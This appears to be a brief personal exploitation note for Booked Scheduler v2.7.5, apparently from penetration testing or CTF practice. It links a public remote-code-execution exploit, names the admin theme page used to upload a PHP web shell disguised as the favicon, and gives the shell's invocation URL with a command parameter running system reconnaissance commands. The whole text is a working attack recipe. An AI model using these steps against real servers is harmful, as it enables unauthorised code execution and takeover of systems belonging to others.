# booked scheduler

## v2.7.5

```
https://github.com/F-Masood/Booked-Scheduler-2.7.5---RCE-Without-MSF

/Web/admin/
# shows directory listing

/Web/admin/manage_theme.php
# updating the favicon.ico to kashz.php
# file is uploaded as custom-favicon.php

# invocation
/Web/custom-favicon.php?cmd=whoami;id;hostname;uname -a
```
